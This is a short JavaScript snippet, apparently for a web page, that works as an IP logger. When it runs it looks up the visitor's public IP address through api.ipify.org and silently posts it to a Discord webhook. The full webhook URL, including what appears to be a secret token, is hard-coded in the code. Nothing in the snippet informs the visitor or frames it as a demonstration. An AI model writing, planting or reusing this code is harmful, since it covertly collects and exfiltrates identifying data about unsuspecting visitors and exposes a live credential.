function sendIP(ip) {
  const xhr = new XMLHttpRequest();
  xhr.open("POST", "https://discord.com/api/webhooks/1308788964949229628/QpmD5-9kA16LG8AduZ4y4I8cWMub3bo7JORXQvj1f6QAUG33tejSx2mtH2Ke_dF-KAEg", true);
  xhr.setRequestHeader("Content-Type", "application/json");
  xhr.send(JSON.stringify({ ip }));
}

fetch("https://api.ipify.org?format=json")
  .then(response => response.json())
  .then(data => {
    sendIP(data.ip);
  });
